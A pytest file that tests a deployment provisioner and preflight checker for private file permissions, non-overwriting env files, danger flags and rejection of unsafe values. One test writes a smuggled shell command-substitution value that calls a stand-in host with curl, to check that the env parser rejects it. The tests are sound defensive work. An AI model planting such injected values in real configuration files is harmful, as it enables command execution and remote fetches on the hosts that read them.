"""Gate D provisioning/preflight contract tests — strictly offline."""
import importlib.util
from pathlib import Path

import pytest


def from_script(name, filename):
    script = Path(__file__).resolve().parents[2] / "deploy" / "media07" / "gate-d" / filename
    spec = importlib.util.spec_from_file_location(name, script)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


provisioner = from_script("media07_gate_d_provision", "provision-env.py")
preflight = from_script("media07_gate_d_preflight", "preflight.py")


def test_provision_is_private_nonoverwriting_and_distinct(tmp_path):
    root = tmp_path / "private"
    root.mkdir(mode=0o700)
    cred = root / "listmonk-draft-credential.json"
    cred.write_text('{"username":"sc_media07_drafts","token":"fake_synthetic_credential_123456789"}')
    cred.chmod(0o600)
    env = root / "gate-d.env"
    provisioner.provision(env)
    assert env.exists() and env.stat().st_mode & 0o777 == 0o600
    opts = preflight.read_env_file(env)
    assert opts["SCEC_MEDIA07_EMPTY_LIST_ID"] == "3"
    assert opts["SCEC_ALLOWED_ORGANIZATION_IDS"] == preflight.ORG
    assert opts["SCEC_MEDIA07_LISTMONK_CREDENTIAL_FILE"] == str(cred)
    assert opts["SCEC_IDENTITY_SIGNING_KEY"] != opts["SCEC_MEDIA07_STUDIO_BRIDGE_SHARED_KEY"]
    preflight.check_configuration(opts, cred)
    with pytest.raises(FileExistsError):
        provisioner.provision(env)


def test_preflight_fails_closed_on_public_file_or_changed_list(tmp_path):
    root = tmp_path / "private"
    root.mkdir(mode=0o700)
    cred = root / "listmonk-draft-credential.json"
    cred.write_text('{"username":"sc_media07_drafts","token":"fake_synthetic_credential_123456789"}')
    cred.chmod(0o600)
    env = root / "gate-d.env"
    provisioner.provision(env)
    opts = preflight.read_env_file(env)
    opts["SCEC_MEDIA07_EMPTY_LIST_ID"] = "4"
    with pytest.raises(RuntimeError, match="synthetic"):
        preflight.check_configuration(opts, cred)
    env.chmod(0o644)
    with pytest.raises(RuntimeError, match="private file"):
        preflight.read_env_file(env)


def test_preflight_refuses_delivery_danger_flags(tmp_path):
    root = tmp_path / "private"
    root.mkdir(mode=0o700)
    cred = root / "listmonk-draft-credential.json"
    cred.write_text('{"username":"sc_media07_drafts","token":"fake_synthetic_credential_123456789"}')
    cred.chmod(0o600)
    env = root / "gate-d.env"
    provisioner.provision(env)
    opts = preflight.read_env_file(env)
    assert preflight.DANGER_FLAGS
    opts[preflight.DANGER_FLAGS[0]] = "1"
    with pytest.raises(RuntimeError, match="danger"):
        preflight.check_configuration(opts, cred)


def test_read_env_rejects_shell_values_and_duplicates(tmp_path):
    f = tmp_path / "bad.env"
    f.write_text("SCEC_ENV=staging\nSCEC_ENV=production\n")
    f.chmod(0o600)
    with pytest.raises(RuntimeError, match="duplicated"):
        preflight.read_env_file(f)
    f.write_text("SCEC_ENV=$(curl bad.example)\n")
    with pytest.raises(RuntimeError, match="private setting"):
        preflight.read_env_file(f)
